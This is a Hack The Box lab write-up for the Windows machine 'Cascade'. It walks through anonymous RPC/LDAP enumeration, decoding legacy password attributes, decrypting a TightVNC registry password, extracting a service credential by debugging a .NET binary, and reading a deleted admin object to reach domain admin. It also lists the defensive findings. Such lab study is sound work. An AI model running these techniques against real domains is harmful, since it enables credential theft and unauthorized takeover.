# Key Takeaways
- There may be extremely important artifacts and information that can be gained by taking a more in-depth look into AD objects via LDAP, if accessible.
- It is important to take notes on information discovered, and re-evaluate how it can be used each time new privileges are gained (root.txt).

# Overview
- Platform: Windows
- HTB Rating: Medium

### Vulnerabilities
- RPC and LDAP allow anonymous connections that are relatively unrestrictive, resulting in enumeration of domain details such as object attributes and users.
- The continued support for a public password field (cascadeLegacyPwd) on domain user objects can result in lateral movement across these users due to the fields' lack of security.
- Lack of a password policy allows for long-standing legacy passwords to remain on current accounts, as well as allows password re-use between Admin accounts.
- Sensitive files are located on network locations, such as `VNC Install.reg`, meeting notes, log files, and database files.
- The AD Recycle Bin is used with msDS-DeletedObjectLifetime (how many days to keep deleted objects around) set to 5000. This extremely large value results in old and potentially insecure and unprotected legacy objects being available for potential privilege escalation.
- Windows Server 2008 is outdated and is no longer releasing security updates, this should be updated.

### Strengths
- The lack of support for SMBv1 prevents easy exploitation via MS17-010.
- While a password policy including complexity should be put in place, domain user passwords were complex enough to prevent initial access via common password spraying.

# Solving user.txt
I began this machine with some basic nmap scans. It appeared that the domain we were attacking was `cascade.local`.

```
└──╼ $sudo nmap -sS -v -A -oA top1000 --top-ports 1000 10.129.4.254
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-25 22:11:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
```

```
└──╼ $sudo nmap -sS -oA alltcp -p- 10.129.4.254
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 17:14 EST
Nmap scan report for 10.129.4.254
Host is up (0.041s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
```

I determined that DNS didn't have any further interesting information for us.
```
└──╼ $dig any cascade.local @10.129.4.254

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> any cascade.local @10.129.4.254
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: FORMERR, id: 55046
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 6822db356f198d91 (echoed)
;; QUESTION SECTION:
;cascade.local.                 IN      ANY

;; Query time: 43 msec
;; SERVER: 10.129.4.254#53(10.129.4.254) (TCP)
;; WHEN: Sun Jan 25 17:14:55 EST 2026
;; MSG SIZE  rcvd: 54


└──╼ $dig axfr cascade.local @10.129.4.254

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr cascade.local @10.129.4.254
;; global options: +cmd
; Transfer failed.
```

SMB did allow anonymous authentication, however I was unable to list any shares.
```
└──╼ $smbclient -N -L \\\\10.129.4.254
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.4.254 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

This prompted me to see if we could use RPC with this null session and query domain information/users, which was successful.
```
└──╼ $rpcclient -U "" -N 10.129.4.254

rpcclient $> querydominfo
Domain:         CASCADE
Server:
Comment:
Total Users:    56
Total Groups:   0
Total Aliases:  11
Sequence No:    1
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1

rpcclient $> getdompwinfo
min_password_length: 5
password_properties: 0x00000000

rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

I saved these users into `fullusers.txt` and then split that into a `users.txt` file which could be used for further enumeration.
```
cat fullusers.txt | sed -n 's/.*user:\[\([^]]*\)\].*/\1/p' > users.txt
```

At this point, I tried a number of things which did not end up being helpful:
1. I tried password spraying with common passwords, usernames set as passwords, as well as variations of usernames as the password.
2. I ran enum4linux-ng to pull further domain information as well as user and group descriptions.
3. Noting the old infrastructure (Windows Server 2008) I dug into common SMB exploits such as MS17-010, however lack of SMBv1 support prevented this.

This was a huge learning experience for me because after wasting a bunch of time, I finally landed on LDAP as a place that I might be able to extract further information. This wasn't something I was super familiar with doing, but immediately jumped up on the list of important items to look into, as it turned out to be extremely useful and less time consuming than expected.

I utilized [windapsearch](https://github.com/ropnop/windapsearch) to enumerate objects anonymously, finding that you can list all atrributes on user objects. This resutls in finding an attribute named `cascadeLegacyPwd` on the `r.thompson` user with a value of `clk0bjVldmE=`.
```
└──╼ $python3 windapsearch.py -u "" --dc-ip 10.129.4.254 -U --full
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.4.254
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=cascade,DC=local
[+] Attempting bind
[+]     ...success! Binded as:
[+]      None

[+] Enumerating all AD users
[+]     Found 15 users:

<SNIP>

objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 487
codePage: 0
countryCode: 0
badPasswordTime: 134138599366154208
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

This value at firce glance looks base64 encoded, so I decoded it and it produces the string, `rY4n5eva`.
```
└──╼ $echo 'clk0bjVldmE=' | base64 -d
rY4n5eva
```

I then verified that this is a valid password for the `r.thompson` user, however it does not give us access via WinRM. I enumerated what SMB shares we have access to with this credential.
```
└──╼ $nxc smb 10.129.4.254 -u r.thompson -p rY4n5eva --shares
SMB         10.129.4.254    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.4.254    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
SMB         10.129.4.254    445    CASC-DC1         [*] Enumerated shares
SMB         10.129.4.254    445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.4.254    445    CASC-DC1         -----           -----------     ------
SMB         10.129.4.254    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.4.254    445    CASC-DC1         Audit$
SMB         10.129.4.254    445    CASC-DC1         C$                              Default share
SMB         10.129.4.254    445    CASC-DC1         Data            READ
SMB         10.129.4.254    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.4.254    445    CASC-DC1         NETLOGON        READ            Logon server share
SMB         10.129.4.254    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.4.254    445    CASC-DC1         SYSVOL          READ            Logon server share
```

I then spidered these shares with Netexec and took a look at what files we have access to.
```
└──╼ $nxc smb 10.129.4.254 -u r.thompson -p rY4n5eva -M spider_plus
└──╼ $cat 10.129.4.254.json
{
    "Data": {
        "IT/Email Archives/Meeting_Notes_June_2018.html": {
            "atime_epoch": "2020-01-15 20:08:46",
            "ctime_epoch": "2020-01-15 20:08:46",
            "mtime_epoch": "2020-01-28 13:00:30",
            "size": "2.46 KB"
        },
        "IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log": {
            "atime_epoch": "2020-01-10 11:19:20",
            "ctime_epoch": "2020-01-10 11:19:20",
            "mtime_epoch": "2020-01-28 20:19:11",
            "size": "1.27 KB"
        },
        "IT/Logs/DCs/dcdiag.log": {
            "atime_epoch": "2020-01-10 11:17:30",
            "ctime_epoch": "2020-01-10 11:17:30",
            "mtime_epoch": "2020-01-26 17:22:05",
            "size": "5.83 KB"
        },
        "IT/Temp/s.smith/VNC Install.reg": {
            "atime_epoch": "2020-01-28 14:27:43",
            "ctime_epoch": "2020-01-28 14:27:43",
            "mtime_epoch": "2020-01-28 15:00:01",
            "size": "2.62 KB"
        }
    },
    "NETLOGON": {
        "MapAuditDrive.vbs": {
            "atime_epoch": "2020-01-15 16:45:08",
            "ctime_epoch": "2020-01-15 16:45:08",
            "mtime_epoch": "2020-01-15 16:50:14",
            "size": "258 B"
        },
        "MapDataDrive.vbs": {
            "atime_epoch": "2020-01-15 16:50:28",
            "ctime_epoch": "2020-01-15 16:49:19",
            "mtime_epoch": "2020-01-15 16:51:03",
            "size": "255 B"
        }
    },
    "SYSVOL": {

<SNIP>

        "cascade.local/scripts/MapAuditDrive.vbs": {
            "atime_epoch": "2020-01-15 16:45:08",
            "ctime_epoch": "2020-01-15 16:45:08",
            "mtime_epoch": "2020-01-15 16:50:14",
            "size": "258 B"
        },
        "cascade.local/scripts/MapDataDrive.vbs": {
            "atime_epoch": "2020-01-15 16:50:28",
            "ctime_epoch": "2020-01-15 16:49:19",
            "mtime_epoch": "2020-01-15 16:51:03",
            "size": "255 B"
        }
    }
}
```

There are a bunch of super interesting files here, so I began downloading them via SMBClient and reading their contents. I was mainly interested in the .vbs scripts, as well as everything in the Data share. 
```
└──╼ $smbclient -U "cascade.local/r.thompson" \\\\10.129.4.254\\Data
Password for [CASCADE.LOCAL\r.thompson]:
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file Meeting_Notes_June_2018.html of size 13312 as Meeting_Notes_June_2018.html (65.0 KiloBytes/sec) (average 65.0 KiloBytes/sec)
<SNIP>
smb: \> exit
```

The .vbs files didn't have any hardcoded credentials. However, the file `Meeting_Notes_June_2018.html` did allude to a "TempAdmin" user that may exist or have been deleted which would share a password wit hthe "normal admin account". This could come in handy later.
```
<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>
```

Our previous finding is corroborated in the `/Ark AD Recycle Bin/ArkAdRecycleBin.log` file where we see the TempAdmin object being moved into the Recycle bin on 8/12/2018. While currently unsure how, I figured that if we could get access to the password for this deleted user, then we would likely have the password to the full Administrator account.
```
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
```

Finally, I started looking into the `VNC Install.reg` file. As it is a .reg file, this is likely a Windows registry export and could be read in plaintext. I first converted it to UTF-8.
```
└──╼ $iconv -f UTF-16LE -t UTF-8 'VNC Install.reg' > output.reg
```

I then read the file, which has some interesting information.
```
└──╼ $cat output.reg
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

A Google search of "VNC Install.reg" found me a [Github page](https://github.com/frizb/PasswordDecrypts) that explains that these VNC reg passwords use a hardcoded DES key, so they can be decrypted. I inserted the "Password" field contents into the pre-made command and it returned what looked to be a password. Considering that this file had been located within the `s.smith` directory, I concluded that we had our 2nd credential pair: `s.smith : sT333ve2`.
```
└──╼ $echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```

I verified this as we were now able to connect to the machine via WinRM and obtain the user.txt flag.
```
└──╼ $evil-winrm -i 10.129.4.254 -u s.smith -p sT333ve2

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\s.smith\Desktop> whoami
cascade\s.smith
*Evil-WinRM* PS C:\Users\s.smith\Desktop> type user.txt
0ce34313baeb24cce4d6cefa78089904
```

# Solving root.txt
I noticed that this user had membership to the "Audit Share" group.
```
*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Audit Share                         Alias            S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

I spidered this share with Netexec to view what files we have access to.
```
    "Audit$": {
        "CascAudit.exe": {
            "atime_epoch": "2020-01-15 17:11:27",
            "ctime_epoch": "2020-01-13 15:01:50",
            "mtime_epoch": "2020-01-28 16:47:08",
            "size": "13 KB"
        },
        "CascCrypto.dll": {
            "atime_epoch": "2020-01-15 17:02:44",
            "ctime_epoch": "2020-01-15 17:02:44",
            "mtime_epoch": "2020-01-29 13:01:26",
            "size": "12 KB"
        },
        "DB/Audit.db": {
            "atime_epoch": "2020-01-15 18:12:26",
            "ctime_epoch": "2020-01-15 18:12:26",
            "mtime_epoch": "2020-01-28 16:43:18",
            "size": "24 KB"
        },
        "RunAudit.bat": {
            "atime_epoch": "2020-01-28 18:28:55",
            "ctime_epoch": "2020-01-28 18:28:55",
            "mtime_epoch": "2020-01-28 18:29:47",
            "size": "45 B"
        },
        "System.Data.SQLite.EF6.dll": {
            "atime_epoch": "2020-01-26 17:25:28",
            "ctime_epoch": "2020-01-26 17:23:58",
            "mtime_epoch": "2020-01-28 15:42:18",
            "size": "182.5 KB"
        },
        "System.Data.SQLite.dll": {
            "atime_epoch": "2020-01-26 17:25:28",
            "ctime_epoch": "2020-01-26 17:23:58",
            "mtime_epoch": "2020-01-28 15:42:18",
            "size": "355 KB"
        },
        "x64/SQLite.Interop.dll": {
            "atime_epoch": "2020-01-26 17:25:27",
            "ctime_epoch": "2020-01-26 17:25:27",
            "mtime_epoch": "2020-01-28 15:42:18",
            "size": "1.56 MB"
        },
        "x86/SQLite.Interop.dll": {
            "atime_epoch": "2020-01-26 17:25:27",
            "ctime_epoch": "2020-01-26 17:25:27",
            "mtime_epoch": "2020-01-28 15:42:18",
            "size": "1.19 MB"
        }
    }
```

These all look like they could be useful for potentially reverse engineering the executable, so I downloaded them all.
```
└──╼ $smbclient -U "cascade.local/s.smith" \\\\10.129.4.254\\Audit$
Password for [CASCADE.LOCAL\s.smith]:
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \CascAudit.exe of size 13312 as CascAudit.exe (65.0 KiloBytes/sec) (average 65.0 KiloBytes/sec)
<SNIP>
smb: \> exit
```

Running `strings` on the CascAudit.exe file didn't return anything particularly helpful, however it did show a number of potential function names and imports such as "set_Password" and "SQLiteDataReader". This prompted me to try to open the `Audit.db` file in SQLite. After some initial querying, a username and encrypted password can be found.
```
└──╼ $sqlite3 Audit.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .schema
CREATE TABLE IF NOT EXISTS "Ldap" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "uname" TEXT,
        "pwd"   TEXT,
        "domain"        TEXT
);
CREATE TABLE sqlite_sequence(name,seq);
CREATE TABLE IF NOT EXISTS "Misc" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Ext1"  TEXT,
        "Ext2"  TEXT
);
CREATE TABLE IF NOT EXISTS "DeletedUserAudit" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Username"      TEXT,
        "Name"  TEXT,
        "DistinguishedName"     TEXT
);
sqlite> SELECT * FROM ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

At this point, it seemed likely that CascAudit.exe was reading from Audit.db and doing something, so it could be decrypting the password in memory. I transferred all of these files to my CommandoVM machine and opened CascAudit.exe in dnSpy. As this is a .NET executable, dnSpy was able to decompile it for us into extremely readable source code. It seems clear in the Main() function that the program is definitely decrypting the password from the database file. It is passing the password into the DecryptString() function alongside the key used to decrypt it, "c4scadek3y654321".

<img width="1409" height="842" alt="image" src="https://github.com/user-attachments/assets/6aa63468-38f0-423c-9e96-d06411df66c4" />

At this point, I figured that if we could simply stop the program mid execution, but after the password is decrypted, then we would be able to grab the password from the locally stored variables. To do this, I set a breakpoint in Main() on line 53, and began debugging in dnSpy. Noting the following line of code, it was important to specify the location of the .db file in the Arguments line.
```c#
using (SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=" + MyProject.Application.CommandLineArgs[0] + ";Version=3;"))
```

<img width="501" height="277" alt="image" src="https://github.com/user-attachments/assets/77a5e05d-2daf-4486-80fa-b03e15c2788a" />

Once the program reaches the breakpoint, we are able to see the decrypted password in the local variables.

<img width="670" height="91" alt="image" src="https://github.com/user-attachments/assets/da019f95-b100-4eab-bc32-c33858600e5c" />

This gives us our next set of credentials: `ArkSvc : w3lc0meFr31nd`. I verified that these are valid.
```
└──╼ $nxc smb 10.129.4.254 -u ArkSvc -p w3lc0meFr31nd
SMB         10.129.4.254    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.4.254    445    CASC-DC1         [+] cascade.local\ArkSvc:w3lc0meFr31nd
```

I then logged into the machine via WinRM and looked at our privileges/memberships. I found that we are in the "AD Recycle Bin" group.
```
*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

I bit of Googling explained that this means that we should at the very least be able to query deleted objects, even if we can't restore them. Remembering that the "TempAdmin" object had been deleted in the past, I started by querying that.
```
*Evil-WinRM* PS C:\> Get-ADObject -Filter 'Name -Like "*TempAdmin*"' -IncludeDeletedObjects

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```

That didn't give anything particularly useful, however we could return more information by adding the `-Properties *` switch. From this, we find that this deleted user object is once again using the insecure `cascadeLegacyPwd` field with the value `YmFDVDNyMWFOMDBkbGVz`.
```
*Evil-WinRM* PS C:\> Get-ADObject -Filter 'Name -Like "*TempAdmin*"' -IncludeDeletedObjects -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

Decoding this value with base64 returns us another password.
```
└──╼ $echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
baCT3r1aN00dles
```

I then verified that this results in admin access.
```
└──╼ $nxc smb 10.129.4.254 -u administrator -p baCT3r1aN00dles
SMB         10.129.4.254    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.4.254    445    CASC-DC1         [+] cascade.local\administrator:baCT3r1aN00dles (Pwn3d!)
```

Finally, I logged into the Administrator account via WinRM and grabbed the root.txt flag.
```
└──╼ $evil-winrm -i 10.129.4.254 -u administrator -p baCT3r1aN00dles

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
cascade\administrator

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
68b3d4df92b20d948621176f10e6daac
```
